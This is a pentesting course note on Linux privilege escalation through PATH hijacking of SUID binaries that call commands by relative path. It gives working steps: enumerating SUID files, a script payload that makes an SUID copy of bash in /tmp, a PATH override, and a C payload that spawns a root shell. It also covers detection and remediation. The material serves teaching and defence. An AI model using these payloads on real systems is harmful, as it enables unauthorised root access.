---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.11 PATH Hijacking"
---

# PATH Environment Variable Hijacking

## Executive Summary

PATH hijacking is a fundamental Linux privilege escalation technique that exploits the way the operating system locates executable files. The `$PATH` environment variable contains a colon-separated list of directories. When a user executes a command without specifying its absolute path (e.g., `ls` instead of `/bin/ls`), the shell searches through the directories listed in `$PATH` sequentially from left to right. If an attacker can modify their `$PATH` variable and trick a privileged program (such as an SUID root binary) into executing a relative command, the attacker can hijack the execution flow. By placing a malicious executable with the same name in a directory controlled by the attacker and prepending that directory to the `$PATH`, the privileged program will inadvertently execute the attacker's payload as `root`.

## Understanding the PATH Variable

The `$PATH` variable dictates the environment's search order.

```bash
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

If a user types `cat`, the system checks `/usr/local/sbin/cat` first. If not found, it checks `/usr/local/bin/cat`, and so on, until it finds `/bin/cat` and executes it.

## The Vulnerability: SUID Binaries and Relative Paths

The vulnerability arises when two conditions are met simultaneously:
1.  **A Privileged Context:** An executable file has the SUID (Set Owner User ID) bit set and is owned by `root`. When executed, this binary runs with `root` privileges regardless of who invoked it.
2.  **Use of Relative Paths:** The SUID binary executes another program internally using a relative path rather than an absolute path (e.g., calling `system("ps")` in C, instead of `system("/bin/ps")`).

Because the SUID binary inherits the environment variables (including `$PATH`) of the user who executes it, an attacker can manipulate their own `$PATH` before running the binary.

## Attack Flow Architecture

```ascii
+-----------------------------------+
|  Attacker Modifies PATH           |
|  export PATH=/tmp:$PATH           |
+-----------------------------------+
                 |
                 v
+-----------------------------------+
|  Attacker executes SUID Binary    |
|  /usr/local/bin/vulnerable_suid   |
+-----------------------------------+
                 |
                 | Binary executes internal command
                 | system("service apache2 restart");
                 v
+-----------------------------------+        +-----------------------------------+
|  Resolving 'service' via PATH     | -----> |  Attacker placed malicious file   |
|  Check PATH Dir 1: /tmp           |        |  /tmp/service                     |
|  Does /tmp/service exist? YES!    |        |  Execution Hijacked! (uid=0)      |
+-----------------------------------+        +-----------------------------------+
                 |                                           |
                 | If No... (Normal flow)                    | Attacker executes /bin/bash
                 v                                           v
+-----------------------------------+        +-----------------------------------+
|  Check PATH Dir 2: /usr/sbin      |        |  Root Shell Granted               |
|  Executes legitimate service      |        |  # id -> uid=0(root)              |
+-----------------------------------+        +-----------------------------------+
```

## Exploitation Phase

Exploiting this vulnerability requires finding a vulnerable SUID binary, identifying the relative command it calls, creating a malicious payload, and hijacking the `$PATH`.

### Step 1: Finding Vulnerable SUID Binaries

First, locate all SUID binaries on the system:
```bash
find / -perm -u=s -type f 2>/dev/null
```

Next, analyze the identified binaries to see if they execute commands without absolute paths. There are three primary ways to do this:

1.  **Using `strings`:**
    Run `strings` on the binary and look for recognizable command names that lack a leading slash.
    ```bash
    strings /usr/local/bin/vulnerable_suid
    # Output snippet:
    # ...
    # Error: service failed
    # service apache2 restart
    # ...
    ```
    The presence of `service apache2 restart` suggests a relative call.

2.  **Using `strace`:**
    Trace the system calls made by the binary. Look for `execve` calls.
    ```bash
    strace -v -f -e execve /usr/local/bin/vulnerable_suid
    # Output snippet:
    # [pid 1234] execve("/usr/local/sbin/service", ["service", "apache2", "restart"], ...
    ```
    If you see it trying to find `service` in multiple locations, it's using the PATH.

3.  **Using `ltrace`:**
    Trace library calls, looking specifically for `system()`, `popen()`, or `execvp()`, which rely on the shell and PATH.
    ```bash
    ltrace /usr/local/bin/vulnerable_suid
    # Output snippet:
    # system("service apache2 restart") = 0
    ```

### Step 2: Creating the Malicious Payload

Suppose we identified that the SUID binary calls `service`. We need to create a malicious executable named `service` in a directory we control, like `/tmp`.

```bash
cd /tmp
cat << EOF > service
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
```

Make the script executable:
```bash
chmod +x /tmp/service
```

### Step 3: Modifying PATH and Executing

Now, manipulate your environment variable to prioritize `/tmp`.

```bash
export PATH=/tmp:$PATH
echo $PATH
# Output: /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Finally, run the vulnerable SUID binary.
```bash
/usr/local/bin/vulnerable_suid
```

The binary will attempt to run `service`. Because `/tmp` is the first directory in the PATH, it will execute `/tmp/service` instead of `/usr/sbin/service`.

Check for the SUID bash binary:
```bash
ls -l /tmp/rootbash
-rwsr-sr-x 1 root root 1.1M Jun  9 12:00 /tmp/rootbash

/tmp/rootbash -p
# id
uid=1000(user) euid=0(root) gid=1000(user)
```

## Edge Cases & Troubleshooting

### Defunct SUID privileges (Bash 4+)
On modern Linux distributions, `/bin/sh` is often a symlink to `/bin/dash`, and `/bin/bash` drops SUID privileges by default unless the `-p` flag is supplied. If the vulnerable C program uses `system("command")`, it invokes `/bin/sh -c "command"`. If `/bin/sh` points to bash, it will drop the effective root UID back to the real UID before executing your malicious script.
**Solution:** Compile a malicious C payload instead of using a bash script, which natively retains the effective UID.

```c
// /tmp/service.c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```
Compile it: `gcc /tmp/service.c -o /tmp/service`

### Secure Execution Environments
Some systems use PAM modules or kernel hardening (like grsecurity) that sanitize the environment variables (including `$PATH`) before executing SUID binaries. In these cases, PATH hijacking will fail because your exported PATH is ignored.

## Detection and Forensics

1.  **SIEM Analytics:** Look for unexpected `$PATH` variable modifications in shell history, particularly those placing world-writable directories (`/tmp`, `/dev/shm`) at the beginning of the PATH.
2.  **Process Monitoring:** Monitor child processes of SUID binaries. If an SUID binary expected to run `tar` suddenly spawns `gcc`, `bash`, or attempts to modify permissions on `/tmp` files, it indicates anomalous behavior.
3.  **Auditing:** Regularly audit custom SUID binaries. System-default SUID binaries are rarely vulnerable to this, but custom scripts compiled by administrators often are.

## Remediation

The fix must be implemented in the source code of the vulnerable application.

1.  **Always Use Absolute Paths:** When writing code that will run with elevated privileges, never rely on the environment.
    *   *Vulnerable:* `system("service apache2 restart");`
    *   *Secure:* `system("/usr/sbin/service apache2 restart");`
2.  **Sanitize the Environment:** If you must use relative paths, hardcode a secure PATH at the beginning of the program.
    ```c
    putenv("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    ```
3.  **Use Safer Functions:** Avoid `system()` entirely in SUID binaries. Use `execve()` and explicitly define the exact binary to execute and its environment.

## Chaining Opportunities

*   **[[18 - SUID Executables]]**: This attack inherently relies on the presence of a poorly programmed SUID executable.
*   **[[10 - Cron Job Abuse PATH Hijacking]]**: The core concept is identical, but applied within the context of cron rather than SUID binaries.

## Related Notes
*   [[01 - Linux Privilege Escalation Fundamentals]]
*   [[18 - SUID Executables]]
*   [[24 - Binary Exploitation Basics]]
